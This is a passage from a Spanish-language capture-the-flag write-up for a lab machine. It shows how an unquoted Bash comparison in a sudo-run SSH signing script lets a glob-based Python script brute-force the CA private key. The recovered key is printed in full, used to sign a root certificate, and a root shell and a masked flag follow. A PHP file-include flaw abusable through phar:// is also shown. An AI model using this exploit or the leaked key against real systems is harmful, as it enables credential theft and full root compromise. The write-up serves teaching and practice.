+ssh-keygen -s "$ca_file" -z "$serial" -I "$username" -V -1w:forever -n "$principal" "$public_key_file"
+```
+{: file="/opt/sign_key.sh" }
+
+Bueno, es un script muy similar al anterior y seguramente es el que se utiliza actualmente para lo que vimos con anterioridad en la web, pero ahora genera una firma con el CA que nosotros le demos, y no deja generar la firma con la llave privada del propio CA... buena verificación pero hay un problema y es que las variable en la comparación de la llave del CA no están entre comillas.
+
+Veáse, si yo creo un archivo `tst` con el siguiente contenido:
+
+```bash
+*
+```
+
+ya que se está comparado el contenido del archivo y no está entre comillas, básicamente esto en la comparación siempre será evaluado a 1 (verdadero) debido a que ese carácter Bash lo considera un glob
+
+```bash
+zzinter@ssg:~/.local/share$ sudo /opt/sign_key.sh tst test.pub uwu support 1 
+Error: Use API for signing with this CA.
+Usage: /opt/sign_key.sh <ca_file> <public_key_file> <username> <principal> <serial>
+```
+
+En cambio, si le quito el asterisco, la comparación retornará falso y el script continuará con su flujo de ejecución regular. Ahora la parte interesante es que el asterisco lo podemos utilizar para buscar patterns en texto que inicie o termine con alguna secuencia de carácteres; es decir,podemos colocar `al*` en la comparación y evaluará a verdadero para toda línea que comienze en `al`.
+
+¿Piensas lo mismo, cierto? Con automatización podemos crearnos un script que utilize este patrón y haga algo similar a un Side Channel Attack que nos retornará toda la llave privada que utiliza el CA para la autenticación en este servidor. En mi caso lo haré en Python:
+
+```python
+import os
+
+# The key is base64 encoded with just some other chars.
+chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-+/= \n\r"
+finished = False
+final = ""
+
+while not finished:
+    old = final
+    for char in chars:
+        # Create temp file
+        temp = open(".tmp", "w")
+        temp.write(final + char + "*")
+        temp.close()
+
+        proc = os.popen("sudo /opt/sign_key.sh .tmp test.pub uwu support 1 2>/dev/null").read()
+     
+        if proc.find("Error: Use API for signing with this CA.") == 0:
+            final += char
+            print(char, end="", flush=True)
+            break
+
+    if old == final:
+        finished = True
+```
+{: file="get_key.py" }
+
+El resultado del script será este, puede que le tome un tiempito:
+
+```bash
+zzinter@ssg:~/.local/share/nano$ python test.py
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAKg7BlysOwZc
+rAAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQ
+AAAEBexnpzDJyYdz+91UG3dVfjT/scyWdzgaXlgx75RjYOo4Hg8Cudy1ShyYfqzC3ANlgA
+cW7Q4MoZuezAE8mNFSmxAAAAIkdsb2JhbCBTU0cgU1NIIENlcnRmaWNpYXRlIGZyb20gSV
+QBAgM=
+-----END OPENSSH PRIVATE KEY-----
+```
+
+Ahora podemos firmar una llave con el principal `root_user` que vimos antes, y ya tendremos acceso como root:
+
+```bash
+❯ ssh-keygen -s ca-key -f zzinter.rsa -I root@ssg -n root_user -V +1d zzinter.rsa.pub
+Signed user key zzinter.rsa-cert.pub: id "root@ssg" serial 0 for root_user valid from 2024-11-23T12:13:00 to 2024-11-24T12:14:33
+❯ /usr/bin/ssh -i zzinter.rsa -p 2222 root@itrc.ssg.htb
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)
+
+... [snip]
+
+root@ssg:~#
+```
+
+Con esto ya podremos tomar la última flag.
+
+```bash
+root@ssg:~# ls -la
+total 40
+drwx------  7 root root 4096 Nov 23 15:08 .
+drwxr-xr-x 19 root root 4096 Jul 24 11:54 ..
+lrwxrwxrwx  1 root root    9 Jun 21 18:10 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
+drwx------  3 root root 4096 Feb  8  2024 .cache
+drwxrwxr-x  5 root root 4096 Aug 13 11:26 docker
+drwxr-xr-x  3 root root 4096 Aug 13 11:08 .local
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rw-r-----  1 root root   33 Nov 23 15:08 root.txt
+drwx------  4 root root 4096 Feb  7  2024 snap
+drwx------  2 root root 4096 Feb  7  2024 .ssh
+root@ssg:~# cat root.txt
+5c22324ca9cec2fee1d2b1a815******
+```
+
+## Extra
+
+La forma en la que obtuvimos el acceso inicial a la máquina fue algo rebuscada, ya que la forma en la que fue planeada ser abusada es utilizando el filtro `phar://` de PHP para cargar un archivo php dentro de algún zip que subamos al sitio.
+
+```php
+<?php session_start();
+
+if (isset($_GET["page"]) and file_exists($_GET["page"] . ".php")){
+    $page = $_GET["page"] . ".php";
+} elseif (isset($_SESSION["username"])) {
+    $page = "dashboard.php";
+} else {
+    $page = "home.php";
+}
+
+require_once "header.inc.php";
+
+echo "<div class=\"main\">";
+include_once $page;
+echo "</div>";
+
+require_once "footer.inc.php";
+?>
+```
+{: file="index.php" }
+
+
